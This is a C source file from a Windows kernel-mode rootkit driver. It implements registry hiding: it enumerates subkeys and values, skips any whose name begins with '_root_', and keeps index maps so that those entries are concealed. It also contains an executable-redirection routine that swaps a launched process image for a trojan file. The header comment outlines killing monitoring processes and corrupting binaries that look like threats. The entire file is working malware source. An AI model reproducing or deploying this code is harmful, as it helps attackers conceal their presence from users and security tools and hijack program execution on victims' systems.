
#include "rk_driver.h"
#include "rk_defense.h"
#include "rk_ioman.h"
#include "rk_memory.h"

/* SELF DEFENSE GROUP
 * All self defense logic should go here.
 * Please be creative!
 *  - If rootkit detects itself being monitored, it
 *    may shut down the attacking process and log
 *    the user off.
 *
 *  - Stealth functions will attempt to hide rootkit
 *    from being monitored.  Unicode names are exploited.
 *
 *  - Any binary that fits a threat profile will be attacked
 *    and destroyed (corrupted).
 */

/* global key string that indicates a hidden or protected object,
 . this can be altered by the user by simply hex-editing the
 . 6 character static string in the binary .sys image */

#define PROTECT_STRING_LENGTH	6
CHAR gProtectString[] = "_root_";
WCHAR gProtectStringW[] = L"_root_";


#define		TRACKFLAG_REGKEY	(0x00000001 << 0)
#define		TRACKFLAG_REGVALUE	(0x00000001 << 1)
#define		TRACKFLAG_PROCESS	(0x00000001 << 2)

/* handle tracking for trojan info */
typedef struct _TRACK_HANDLE
{
	struct _TRACK_HANDLE *mNext;
	struct _TRACK_HANDLE *mPrev;
	HANDLE	mHandle;
	ULONG	mType;
	PVOID	mValueData;
	PVOID	mKeyData;
} TRACK_HANDLE, *PTRACK_HANDLE;

TRACK_HANDLE gTrackHead;

typedef struct _MAP_REGVALUE
{
	struct _MAP_REGVALUE *mNext;
	ULONG	mRealIndex;
	ULONG	mTrojanIndex;
} MAP_REGVALUE, *PMAP_REGVALUE;

typedef struct _TRACK_REGVALUE
{
	ULONG	mNumberOfValues; /* trojan value to report */
	PMAP_REGVALUE mRegMap;
} TRACK_REGVALUE, *PTRACK_REGVALUE;


void InitDefenseSystem()
{
	memset(&gTrackHead, 0, sizeof(TRACK_HANDLE));
}

PTRACK_HANDLE FindTrackHandle( HANDLE aHandle )
{
	PTRACK_HANDLE p = &gTrackHead;
	DbgPrint("rootkit: FindTrackHandle() with handle %X\n", aHandle);

	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
	
	while(p->mNext != NULL)
	{
		p = p->mNext;
		ASSERT(p->mHandle)
		ASSERT(p->mValueData)
		if(p->mHandle == aHandle)
		{
			DbgPrint("rootkit: found handle\n");
			KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
			return p;
		}
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
	return NULL;
}

void AddNewTrackHandle( PTRACK_HANDLE theNewTrack )
{
	PTRACK_HANDLE p = &gTrackHead;

	ASSERT(theNewTrack->mHandle)
	ASSERT(theNewTrack->mValueData)

	DbgPrint("rootkit: AddNewTrackHandle()\n");

	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	while(p->mNext != NULL){
		p = p->mNext;
		ASSERT(p->mHandle)
		ASSERT(p->mValueData)
	}
	p->mNext = theNewTrack;
	theNewTrack->mNext = NULL;
	theNewTrack->mPrev = p;

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
}

ULONG GetRegValueMapping( HANDLE hKey, ULONG realIndex)
{
	PTRACK_HANDLE p = FindTrackHandle(hKey);
	
	DbgPrint("rootkit: GetRegValueMapping()\n");
	
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	if(p)
	{
		/* return data about this handle */
		if(p->mType & TRACKFLAG_REGVALUE)
		{
			if(	p->mValueData )
			{
				PTRACK_REGVALUE track_reg = ((PTRACK_REGVALUE)(p->mValueData));
				if(track_reg)
				{
					PMAP_REGVALUE rv = track_reg->mRegMap;

					ASSERT(rv)

					while(rv)
					{
						rv = rv->mNext;
						if(rv)
						{
							DbgPrint("rootkit: checking value map real %d to trojan %d\n", rv->mRealIndex, rv->mTrojanIndex);
							if(realIndex == rv->mRealIndex)
							{
								ULONG aTrojanIndex = rv->mTrojanIndex; 
								KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
								return aTrojanIndex; /* found it */
							}
						}
					}
				}
			}
		}		
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);

	return -1;
}

ULONG GetRegSubkeyMapping( HANDLE hKey, ULONG realIndex)
{
	PTRACK_HANDLE p = FindTrackHandle(hKey);
	
	DbgPrint("rootkit: GetRegSubkeyMapping()\n");
	
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	if(p)
	{
		/* return data about this handle */
		if(p->mType & TRACKFLAG_REGVALUE)
		{
			if(	p->mKeyData )
			{
				PTRACK_REGVALUE track_reg = ((PTRACK_REGVALUE)(p->mKeyData));
				if(track_reg)
				{
					PMAP_REGVALUE rv = track_reg->mRegMap;
					
					ASSERT(rv)

					while(rv)
					{
						rv = rv->mNext;
						if(rv)
						{
							DbgPrint("rootkit: checking subkey map real %d to trojan %d\n", rv->mRealIndex, rv->mTrojanIndex);
							if(realIndex == rv->mRealIndex)
							{
								ULONG aTrojanIndex = rv->mTrojanIndex; 
								KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
								return aTrojanIndex; /* found it */
							}
						}
					}
				}
			}
		}		
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);

	return -1;
}

ULONG GetNumberOfValues( HANDLE hKey )
{
	PTRACK_HANDLE p = FindTrackHandle(hKey);
	
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	if(p)
	{
		/* return data about this handle */
		if(p->mType & TRACKFLAG_REGVALUE)
		{
			PTRACK_REGVALUE track_reg = ((PTRACK_REGVALUE)(p->mValueData));
			if(	track_reg )
			{
				ULONG aNumberOfValues = track_reg->mNumberOfValues;
				KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
				return( aNumberOfValues );
			}
		}		
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
	return -1;
}

ULONG GetNumberOfSubkeys( HANDLE hKey )
{
	PTRACK_HANDLE p = FindTrackHandle(hKey);
	
	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	if(p)
	{
		/* return data about this handle */
		if(p->mType & TRACKFLAG_REGVALUE)
		{
			PTRACK_REGVALUE track_reg = ((PTRACK_REGVALUE)(p->mKeyData));
			if(	track_reg )
			{
				ULONG aNumberOfValues = track_reg->mNumberOfValues;
				KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
				return( aNumberOfValues );
			}
		}		
	}

	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
	return -1;
}

void FreeTrackHandle( HANDLE theHandle )
{
	PTRACK_HANDLE p = FindTrackHandle(theHandle);

	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);

	if(p)
	{
		PTRACK_HANDLE j = p->mPrev;
		PTRACK_HANDLE k = p->mNext;

		DbgPrint("rootkit: found the handle, cutting\n");

		/* we had better not be first in this list */
		ASSERT(j)
		if(j->mNext != p)
		{
			DbgPrint("rootkit: detected invalid list ordering (a) !\n");
			__asm int 3
		}

		j->mNext = k; /* slice this one out part 1 */
		
		if(k)
		{
			if(k->mPrev != p)
			{
				DbgPrint("rootkit: detected invalid list ordering (b) !\n");
				__asm int 3
			}
			k->mPrev = j; /* slice this one out part 2 */
		}
	}
	/* we can release now that were out of the way */
	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);

	if(p)
	{
		ASSERT(p->mHandle)

		if(p->mType & TRACKFLAG_REGVALUE)
		{
			PTRACK_REGVALUE track_reg = NULL;

			ASSERT(p->mValueData)
			ASSERT(p->mKeyData)
		
			/* ___________________________________________________________
			 . VALUE data
			 . ___________________________________________________________ */
			track_reg = ((PTRACK_REGVALUE)(p->mValueData));
			
			DbgPrint("free part 2\n");
			if(track_reg)
			{
				PMAP_REGVALUE rv = track_reg->mRegMap;
				while(rv)
				{
					PMAP_REGVALUE rv_tmp = rv->mNext;
					DbgPrint("freeing rv\n");
					__try
					{
						ExFreePool(rv);
					}
					__except(EXCEPTION_EXECUTE_HANDLER)
					{
						DbgPrint("rootkit: internal error, attempt to free invalid memory!\n");
						__asm int 3
					}
					rv = rv_tmp;
				}
				ExFreePool(track_reg);
			}

			/* ________________________________________________________________
			 . SubKEY data
			 . ________________________________________________________________ */
			track_reg = ((PTRACK_REGVALUE)(p->mKeyData));
			DbgPrint("free part 3\n");
			if(track_reg)
			{
				PMAP_REGVALUE rv = track_reg->mRegMap;
				while(rv)
				{
					PMAP_REGVALUE rv_tmp = rv->mNext;
					DbgPrint("freeing rv2\n");
					ExFreePool(rv);
					rv = rv_tmp;
				}
				ExFreePool(track_reg);
			}
		}	

		ExFreePool(p);
	}
}

PTRACK_HANDLE CreateNewTrackHandle( HANDLE Handle, ULONG CreationFlags )
{
	PTRACK_HANDLE p = NULL;
	DbgPrint("rootkit: CreateNewTrackHandle()\n");

	ASSERT(Handle)

	if(CreationFlags & TRACKFLAG_REGVALUE)
	{
		p = ExAllocatePool(PagedPool, sizeof(TRACK_HANDLE));
		if(p)
		{
			memset(p, 0, sizeof(TRACK_HANDLE));
			p->mType = TRACKFLAG_REGVALUE;
			p->mHandle = Handle;
			
			p->mValueData = ExAllocatePool(PagedPool, sizeof(TRACK_REGVALUE));
			if(p->mValueData)
			{
				PTRACK_REGVALUE track_reg;
				memset(p->mValueData, 0, sizeof(TRACK_REGVALUE));
				/* ______________________________________________________
				 . The TRACK_REGVALUE type stores a mapping of known good
				 . value indices to trojan indices 
				 . ______________________________________________________ */
				track_reg = ((PTRACK_REGVALUE)(p->mValueData));
				track_reg->mNumberOfValues = 0;
				track_reg->mRegMap = ExAllocatePool(PagedPool, sizeof(MAP_REGVALUE));
				
				ASSERT(track_reg->mRegMap)
				
				if(track_reg->mRegMap)
				{
					memset(track_reg->mRegMap, 0, sizeof(MAP_REGVALUE));
				}
			}

			p->mKeyData = ExAllocatePool(PagedPool, sizeof(TRACK_REGVALUE));
			
			ASSERT(p->mKeyData)
	
			if(p->mKeyData)
			{
				PTRACK_REGVALUE track_reg;
				/* ______________________________________________________
				 . The TRACK_REGVALUE type stores a mapping of known good
				 . value indices to trojan indices 
				 . ______________________________________________________ */
				memset(p->mKeyData, 0, sizeof(TRACK_REGVALUE));
				track_reg = ((PTRACK_REGVALUE)(p->mKeyData));
				track_reg->mNumberOfValues = 0;
				track_reg->mRegMap = ExAllocatePool(PagedPool, sizeof(MAP_REGVALUE));
				
				ASSERT(track_reg->mRegMap)
				
				if(track_reg->mRegMap)
				{
					memset(track_reg->mRegMap, 0, sizeof(MAP_REGVALUE));
				}
			}
		}
	}

	ASSERT(p->mHandle)
	ASSERT(p->mValueData)
	ASSERT(p->mKeyData)
	
	return p;
}

/* not threadsafe, make sure p isn't currently in global list */
void AddRegMapValuePair( PTRACK_HANDLE p, ULONG realIndex, ULONG trojanIndex )
{
	PTRACK_REGVALUE track_reg = NULL;
	
	ASSERT(p)

	DbgPrint("rootkit: AddRegMapValuePair() %d %d\n", realIndex, trojanIndex);
	if(	(p)
		&&
		(p->mType & TRACKFLAG_REGVALUE)
		&&
		(p->mValueData) )
	{
		track_reg =((PTRACK_REGVALUE)(p->mValueData));

		if(track_reg)
		{
			PMAP_REGVALUE rv = track_reg->mRegMap;
			/* _____________________________________________
			 . we should currently have a RV head, the list
			 . head is not used, BTW 
			 . _____________________________________________ */
			
			ASSERT(rv)

			while(rv)
			{
				/* add new regvalue mapping to end of list */
				if(rv->mNext == NULL)
				{
					rv->mNext = ExAllocatePool(PagedPool, sizeof(MAP_REGVALUE));
					
					ASSERT(rv->mNext)

					if(rv->mNext)
					{
						memset(rv->mNext, 0, sizeof(MAP_REGVALUE));

						DbgPrint("rootkit: adding new regmap\n");
					
						rv->mNext->mRealIndex = realIndex;
						rv->mNext->mTrojanIndex = trojanIndex;
						
						ASSERT( NULL == rv->mNext->mNext)
						break;
					}
				}
				rv = rv->mNext;
			}
		}
	}
}

/* not threadsafe, make sure p isn't currently in global list */
void AddRegMapKeyPair( PTRACK_HANDLE p, ULONG realIndex, ULONG trojanIndex )
{
	PTRACK_REGVALUE track_reg = NULL;
	
	ASSERT(p)

	DbgPrint("rootkit: AddRegMapKeyPair() %d %d\n", realIndex, trojanIndex);
	if(	(p)
		&&
		(p->mType & TRACKFLAG_REGVALUE)
		&&
		(p->mKeyData) )
	{
		track_reg =((PTRACK_REGVALUE)(p->mKeyData));

		if(track_reg)
		{
			PMAP_REGVALUE rv = track_reg->mRegMap;
			/* _____________________________________________
			 . we should currently have a RV head, the list
			 . head is not used, BTW 
			 . _____________________________________________ */
			
			ASSERT(rv)

			while(rv)
			{
				/* add new regvalue mapping to end of list */
				if(rv->mNext == NULL)
				{
					rv->mNext = ExAllocatePool(PagedPool, sizeof(MAP_REGVALUE));
					
					ASSERT(rv->mNext)

					if(rv->mNext)
					{
						memset(rv->mNext, 0, sizeof(MAP_REGVALUE));

						DbgPrint("rootkit: adding new regmap\n");
					
						rv->mNext->mRealIndex = realIndex;
						rv->mNext->mTrojanIndex = trojanIndex;
						
						ASSERT( NULL == rv->mNext->mNext)
						break;
					}
				}
				rv = rv->mNext;
			}
		}
	}
}


/* when a process is going to enumerate the values under a key, this function
 . makes sure the hidden values are kept track of */
int SetupFakeValueMap( HANDLE pHandle, HANDLE hKey )
{
	// for enumerating a subkey 
    PVOID pInfo; 
    ULONG ResultLength; 
    ULONG Size;

	int index = 0;
	int offset_index = 0;
	int rc;
	int numValuesToShow = 0;
	int numSubkeysToShow = 0;

	PTRACK_HANDLE p = 0;

	ASSERT(hKey)
	ASSERT(pHandle)

	/* ___________________________________________________________
	 . a new key has been opened - we need to update data about it
	 . ___________________________________________________________ */

	p = FindTrackHandle(hKey);

	/* I've failed this assertion a couple of times - no crash - but weird */
	ASSERT(NULL == p)

	DbgPrint("rootkit: SetupFakeValueMap() with hKey 0x%X\n", hKey);
	
	if(p) FreeTrackHandle(hKey);
	p = CreateNewTrackHandle( hKey, TRACKFLAG_REGVALUE );
	
	/* arbritrary */
	Size = 216;
	pInfo = ExAllocatePool(PagedPool, Size); 

    if (pInfo == NULL) 
	{  
        return -1; 
    }

	
	/* _________________________________ 
	 . enumerate subkeys
	 . _________________________________ */
	for(;;)
	{
		rc = ZwEnumerateKey(
				hKey, 
                index,  
                KeyBasicInformation, 
                pInfo, 
                Size, 
                &ResultLength);
		if( STATUS_SUCCESS == rc ) 
		{
			DbgPrint("rootkit: enum subkey index %d\n", index);
			/* __________________________________________
			 . compare value name to our predefined 
			 . protection string.  If it matches, then
			 . make sure we have a trojan mapping for it.
			 . offset_index keeps track of value indexes
			 . that we have "skipped".
			 . __________________________________________ */
			if( !wcsncmp(
						((KEY_BASIC_INFORMATION *)pInfo)->Name,
						gProtectStringW,
						PROTECT_STRING_LENGTH))
			{
				DbgPrint("rootkit: detected protected subkey %s\n", gProtectString);
				offset_index++;
			}
			else
			{
				numSubkeysToShow++;
			}
			AddRegMapKeyPair( p, index, (index + offset_index));
			index++;
		}
		else
		{
			DbgPrint("rootkit: error %X\n", rc);
			break;
		}
	}

	index = 0;
	offset_index = 0;
	/* _________________________________ 
	 . enumerate values
	 . _________________________________ */
	for(;;)
	{
		rc = ZwEnumerateValueKey(
				hKey, 
                index,  
                KeyValueBasicInformation, 
                pInfo, 
                Size, 
                &ResultLength);
	
		if( STATUS_SUCCESS == rc ) 
		{
			DbgPrint("rootkit: enum value index %d\n", index);
			/* __________________________________________
			 . compare value name to our predefined 
			 . protection string.  If it matches, then
			 . make sure we have a trojan mapping for it.
			 . offset_index keeps track of value indexes
			 . that we have "skipped".
			 . __________________________________________ */
			if( !wcsncmp(
						((KEY_VALUE_BASIC_INFORMATION *)pInfo)->Name,
						gProtectStringW,
						PROTECT_STRING_LENGTH))
			{
				DbgPrint("rootkit: detected protected value %s\n", gProtectString);
				offset_index++;
			}
			else
			{
				numValuesToShow++;
			}
			AddRegMapValuePair( p, index, (index + offset_index));
			index++;
		}
		else
		{
			DbgPrint("rootkit: error %X\n", rc);
			break;
		}
	}
	ExFreePool((PVOID)pInfo);
	
	/* update data about this handle */
	if(p)
	{
		PTRACK_REGVALUE track_reg = ((PTRACK_REGVALUE)(p->mValueData));
		DbgPrint("rootkit: adding track value!\n");
		if(track_reg)
		{
			track_reg->mNumberOfValues = numValuesToShow;
		}
		track_reg = ((PTRACK_REGVALUE)(p->mKeyData));
		if(track_reg)
		{
			track_reg->mNumberOfValues = numSubkeysToShow;
		}
		AddNewTrackHandle(p);
	}
	
	return 0;
}

HANDLE gFileHandle = 0;
HANDLE gSectionHandle = 0;
HANDLE gRedirectSectionHandle = 0;
HANDLE gRedirectFileHandle = 0;

/* ____________________________________________
 . watch this file handle - if they attempt to
 . launch a process - redirect it!
 . ____________________________________________ */
void WatchProcessHandle( HANDLE theFileH )
{
	NTSTATUS rc;
	HANDLE hProcessCreated, hProcessOpened, hFile, hSection;
	OBJECT_ATTRIBUTES ObjectAttr;
	UNICODE_STRING ProcessName;
	UNICODE_STRING SectionName;
	UNICODE_STRING FileName;
	LARGE_INTEGER MaxSize;
	ULONG SectionSize=8192;
		

	IO_STATUS_BLOCK ioStatusBlock;
	ULONG allocsize = 0;

	DbgPrint("rootkit: Loading Trojan File Image\n");

	/* first open file w/ NtCreateFile 
	 . this works for a Win32 image.  
	 . calc.exe is just for testing.
	 */

	RtlInitUnicodeString(&FileName, L"\\??\\C:\\calc.exe");
	InitializeObjectAttributes( &ObjectAttr,
								&FileName,
								OBJ_CASE_INSENSITIVE,
								NULL,
								NULL);
	

	rc = ZwCreateFile(
		&hFile,
		GENERIC_READ | GENERIC_EXECUTE,
		&ObjectAttr,
		&ioStatusBlock,
		&allocsize,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		0,
		NULL,
		0);
	if (rc!=STATUS_SUCCESS) {
		DbgPrint("Unable to open file, rc=%x\n", rc);
		return 0;
	}

	SetTrojanRedirectFile( hFile );

	gFileHandle = theFileH;
}

HANDLE CheckForRedirectedFile( HANDLE hFile )
{
	if(hFile == gFileHandle)
	{
		DbgPrint("rootkit: Found redirected filehandle - from %x to %x\n", hFile, gRedirectFileHandle);
		return gRedirectFileHandle;
	}
	return NULL;
}

void SetTrojanRedirectFile( HANDLE hFile )
{
	gRedirectFileHandle = hFile;
}
